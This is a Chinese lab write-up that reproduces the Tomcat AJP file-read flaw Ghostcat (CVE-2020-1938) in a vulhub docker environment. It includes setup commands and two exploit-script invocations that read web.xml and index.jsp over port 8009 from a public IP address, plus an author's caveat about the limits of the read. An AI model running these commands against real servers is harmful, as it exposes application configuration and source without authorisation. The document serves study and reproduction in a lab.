ailx10说：这篇是我2024年10月写的。这里又收录了 Ghostcat 的那次练习：从 AJP 通道去读应用目录里的配置和 JSP，看看服务除了浏览器里常见的页面，还暴露了怎样的文件访问面。我用脚本把请求和结果记下来，同时留了读取范围的提醒。重复条目不等于多了一份独立验证，它对应的仍是同一次历史实验。现在重新看，我更想强调端口可达和应用目录这两个条件；没有展示出来的系统文件读取或代码执行，就不该替它补成完成了。

本文记录 Ghostcat（CVE-2020-1938）历史实验中的 AJP 请求与文件读取。

该条与 A0273 重复收录；请求结果取决于连接器、版本和 Web 应用上下文，不应称可读取系统任意文件。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build` `//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）环境搭建成功了

![](/notes-assets/31989b447cf7cc606b5d.webp)

（1）使用 Python2.7 脚本[\[1\]](#ref_1)，文件读取 `/WEB-INF/web.xml`

```
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml 144.34.162.13
```

![](/notes-assets/909f0973ffc11d452afa.webp)

（2）读取 `index.jsp` 文件

```
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f index.jsp 144.34.162.13
```

![](/notes-assets/e05fc0bd6f907e70412b.webp)

（3）同理，可以读取 `/usr/local/tomcat/webapps/ROOT` 目录下的任意文件

![](/notes-assets/dd402e55f53888910c05.webp)
